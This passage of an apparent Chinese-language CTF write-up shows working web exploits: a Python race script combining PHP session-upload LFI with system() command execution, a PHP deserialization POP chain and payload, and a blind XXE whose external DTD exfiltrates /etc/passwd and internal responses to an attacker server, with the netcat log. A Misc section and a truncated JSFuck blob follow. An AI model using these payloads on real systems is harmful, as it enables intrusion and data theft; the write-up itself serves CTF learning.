class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            <span class="string">&#x27;http://81.70.102.209:10040/index.php&#x27;</span>,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php echo &#x27;123aaa&#x27;;system(&#x27;cat /f1aggggggggggggggggggggggg&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;http://81.70.102.209:10040/index.php?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;http://81.70.102.209:10040/index.php?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;123aaa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="comment"># with open(&#x27;return.html&#x27;, &#x27;w&#x27;) as f:</span></span><br><span class="line">            <span class="comment">#     f.write(response.text)</span></span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;value = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$func</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span>(<span class="keyword">$this</span>-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$array</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;array = [<span class="keyword">new</span> c(<span class="string">&#x27;\system&#x27;</span>), <span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;value = [<span class="keyword">new</span> c(<span class="string">&#x27;cat /flag&#x27;</span>), <span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = serialize(<span class="keyword">new</span> x);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> a;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$p</span>);</span><br></pre></td></tr></table></figure><p>执行完及那个 x 类的内容数量从 2 改为 3</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:TzoxOiJhIjoyOntzOjQ6Im5pY2UiO3M6Mzc6Ik86MToieCI6Mzp7czo1OiJ2YWx1ZSI7TjtzOjI6ImNjIjtOO30iO3M6NDoidGVzdCI7TzoxOiJiIjoyOntzOjU6InZhbHVlIjthOjI6e2k6MDtPOjE6ImMiOjE6e3M6NToidmFsdWUiO3M6OToiY2F0IC9mbGFnIjt9aToxO3M6NToic2hlbGwiO31zOjU6ImFycmF5IjthOjI6e2k6MDtPOjE6ImMiOjE6e3M6NToidmFsdWUiO3M6NzoiXHN5c3RlbSI7fWk6MTtzOjU6InNoZWxsIjt9fX0=</span><br></pre></td></tr></table></figure><h2 id="退学申请提交处"><a href="#退学申请提交处" class="headerlink" title="退学申请提交处"></a>退学申请提交处</h2><p>进去一看是个XXE，没有回显，利用vps进行得到回显</p><p>注入payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">submit</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://82.157.174.226:10002/demo.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">submit</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">stuid</span>&gt;</span><span class="tag">&lt;/<span class="name">stuid</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">submit</span>&gt;</span></span><br></pre></td></tr></table></figure><p>vps文件demo.dtd：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:port?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>成功注入，查看内网主机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/host&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:port?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IP address       HW type     Flags       HW address            Mask     Device</span><br><span class="line"><span class="number">192.168</span><span class="number">.2</span><span class="number">.2</span>      <span class="number">0x1</span>         <span class="number">0x0</span>         <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>     *        eth0</span><br><span class="line"><span class="number">192.168</span><span class="number">.2</span><span class="number">.4</span>      <span class="number">0x1</span>         <span class="number">0x0</span>         <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>     *        eth0</span><br><span class="line"><span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>      <span class="number">0x1</span>         <span class="number">0x2</span>         <span class="number">02</span>:<span class="number">42</span>:ad:<span class="number">91</span>:ff:<span class="number">31</span>     *        eth0</span><br><span class="line"><span class="number">192.168</span><span class="number">.2</span><span class="number">.6</span>      <span class="number">0x1</span>         <span class="number">0x0</span>         <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>     *        eth0</span><br><span class="line"><span class="number">192.168</span><span class="number">.2</span><span class="number">.8</span>      <span class="number">0x1</span>         <span class="number">0x2</span>         <span class="number">02</span>:<span class="number">42</span>:c0:a8:<span class="number">02</span>:<span class="number">08</span>     *        eth0</span><br><span class="line"><span class="number">192.168</span><span class="number">.2</span><span class="number">.3</span>      <span class="number">0x1</span>         <span class="number">0x0</span>         <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>     *        eth0</span><br></pre></td></tr></table></figure><p>一个一个试一下，最终在192.168.2.8</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://192.168.2.8&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:port?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>服务器得到回显</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@VM<span class="number">-8</span><span class="number">-15</span>-debian:~# nc -lvp <span class="number">10080</span></span><br><span class="line">listening on [any] <span class="number">10080</span> ...</span><br><span class="line"><span class="number">81.70</span><span class="number">.102</span><span class="number">.209</span>: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [<span class="number">10.0</span><span class="number">.8</span><span class="number">.15</span>] from (UNKNOWN) [<span class="number">81.70</span><span class="number">.102</span><span class="number">.209</span>] <span class="number">38430</span></span><br><span class="line">GET /?p=aGVjdGZ7YjFpbmRfMDBCX3hYZX0= HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">82.157</span><span class="number">.174</span><span class="number">.226</span>:<span class="number">10080</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>base64解码即得到flag</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="快来公众号ya"><a href="#快来公众号ya" class="headerlink" title="快来公众号ya"></a>快来公众号ya</h2><p>关注公众号回复flag获得</p><h2 id="JamesHarden"><a href="#JamesHarden" class="headerlink" title="JamesHarden"></a>JamesHarden</h2><p>压缩出来看了下文件头，还是一个zip压缩包，里面有个class</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java JamesHarden</span><br></pre></td></tr></table></figure><p>得到URPGS{Jr1p0zr_G0_U3pg6_!}，觉得是凯撒，试了一下确实是，位移12位</p><h2 id="捉迷藏"><a href="#捉迷藏" class="headerlink" title="捉迷藏"></a>捉迷藏</h2><p>word文件进去全选修改格式，得到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]